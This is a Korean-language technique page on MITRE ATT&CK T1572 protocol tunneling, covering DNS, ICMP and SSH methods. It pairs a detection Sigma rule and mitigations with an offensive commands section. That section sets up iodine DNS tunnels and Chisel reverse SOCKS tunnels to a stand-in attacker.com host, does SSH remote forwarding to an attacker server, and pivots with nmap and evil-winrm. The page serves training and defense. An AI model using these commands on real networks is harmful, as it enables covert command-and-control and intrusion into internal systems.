# T1572 — Protocol Tunneling

## 개요

**TA0011 / T1572**  
DNS, ICMP, SSH 등 허용된 프로토콜 내부에 C2 트래픽을 숨기는 기법입니다. 방화벽과 네트워크 모니터링 장비를 우회하기 위해 정상적인 프로토콜 안에 악성 통신을 캡슐화합니다.

---

## 동작 방식

**DNS 터널링:**
- DNS 쿼리/응답에 데이터를 인코딩하여 은닉
- DNS는 일반적으로 차단하지 않으므로 방화벽 우회 가능
- 데이터를 서브도메인 레이블에 Base32/Base64 인코딩

**ICMP 터널링:**
- Ping 패킷의 데이터 필드에 페이로드 삽입
- ping flood로 위장 가능

**SSH 터널링:**
- 암호화된 SSH 채널을 통해 다른 프로토콜 포워딩
- -L (로컬), -R (원격), -D (동적/SOCKS) 포워딩

---

## 주요 커맨드 / 실습

### iodine DNS 터널링
```bash
# 서버 측 (공격자 서버, DNS 권한 설정 필요)
iodined -f -c -P "tunnelpass" 10.0.0.1 tunnel.attacker.com

# 클라이언트 측 (피해 시스템)
iodine -f -P "tunnelpass" tunnel.attacker.com

# 연결 후 SSH over DNS
ssh user@10.0.0.1 -o ProxyCommand="iodine -f tunnel.attacker.com"
```

### SSH 터널링
```bash
# 로컬 포트 포워딩 (로컬 8080 → 원격 내부 서버:80)
ssh -L 8080:internal-server:80 user@jump-host

# 원격 포트 포워딩 (공격자 서버:4444 → 피해 내부망:22)
ssh -R 4444:localhost:22 attacker@attacker-server

# 동적 SOCKS5 프록시 (내부망 전체 액세스)
ssh -D 1080 user@jump-host
# proxychains 설정 후 내부망 접근

# 백그라운드 실행
ssh -f -N -D 1080 user@jump-host
```

### Chisel - 역방향 SOCKS 터널
```bash
# 공격자 서버에서 Chisel 서버 실행
chisel server --port 8080 --reverse

# 피해 시스템에서 Chisel 클라이언트 실행
chisel client attacker.com:8080 R:socks

# 역방향 포트 포워딩
chisel client attacker.com:8080 R:9090:internal-host:9090

# proxychains로 내부망 접근
proxychains nmap -sT -p 22,80,443 10.0.0.0/24
proxychains evil-winrm -i 10.0.0.5 -u administrator -p 'Password123!'
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: Excessive DNS TXT/NULL Queries Indicating DNS Tunneling
id: a4c8e5b2-7f3d-4e1a-9c6b-2d8f5e7b3a1c
status: stable
description: Detects DNS tunneling by monitoring for excessive TXT or NULL record queries
logsource:
    product: dns
    service: dns_query
detection:
    selection:
        QueryType|contains:
            - 'TXT'
            - 'NULL'
    condition: selection | count(QueryName) by QueryName > 100
timeframe: 1m
falsepositives:
    - SPF/DKIM/DMARC validation queries
    - Legitimate DNS-based load balancing
level: high
tags:
    - attack.command_and_control
    - attack.t1572
```

---

## 대응 방안

1. DNS 쿼리 길이 및 엔트로피 모니터링 (비정상 긴 서브도메인 탐지)
2. 내부 DNS 서버를 통한 강제 DNS 해석 (직접 외부 DNS 쿼리 차단)
3. DNS 응답 데이터 크기 제한 및 이상 탐지
4. SSH 터널링 탐지: 비표준 포트의 SSH 트래픽 차단
5. UEBA로 비정상 아웃바운드 트래픽 패턴 탐지
6. 허가된 아웃바운드 포트만 허용 (최소 허용 방화벽 정책)

---

## 참고자료
- [MITRE ATT&CK T1572](https://attack.mitre.org/techniques/T1572/)
- [Chisel GitHub](https://github.com/jpillora/chisel)
- [iodine GitHub](https://github.com/yarrick/iodine)
- [DNS 터널링 탐지 방법론](https://www.sans.org/white-papers/detecting-dns-tunneling-36031/)
